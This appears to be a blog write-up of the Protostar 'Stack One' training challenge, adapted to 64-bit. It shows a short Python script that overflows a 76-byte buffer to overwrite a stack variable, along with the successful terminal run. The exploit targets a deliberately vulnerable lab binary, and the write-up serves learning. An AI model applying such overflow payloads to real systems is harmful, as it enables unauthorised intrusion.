<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar x64 - Stack One</strong></h1>
        <a href="https://exploit.education/protostar/stack-one/">https://exploit.education/protostar/stack-one/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\5-1.png" src="images/5-1.png"><br>
        <br>
        The goal of Stack One is to overflow the <code>buffer</code> variable and overwrite the <code>modified</code> variable on the stack with <code>0x61626364</code>.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>struct.pack</strong></h2><br>
        I know from Stack Zero that the offset to the <code>modified</code> variable is 76 bytes.<br>
        <br>
        All we have to do to solve Stack One is, instead of packing <code>0x61626364</code> as a 32-bit value with <code>struct.pack('&lt;I', 0x61626364)</code>, we pack as a 64-bit value with <code>struct.pack('&lt;Q',</code><br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;One</span><br>
                <br>
                import&nbsp;struct<br>
                <br>
                buffer&nbsp;=&nbsp;76<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;buffer<br>
                payload&nbsp;+=&nbsp;struct.pack<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;0x61626364<span style="color:#ff9d00;font-weight:700">)</span><br>
                <br>
                print&nbsp;payload
            </div>
        </div><br>
        <br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack1&nbsp;$<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;stack1.py<span style="color:#ff9d00;font-weight:700">)</span><br>
                you&nbsp;have&nbsp;correctly&nbsp;got&nbsp;the&nbsp;variable&nbsp;to&nbsp;the&nbsp;right&nbsp;value
            </div>
        </div>
    </writeup>
</section>

</body>
</html>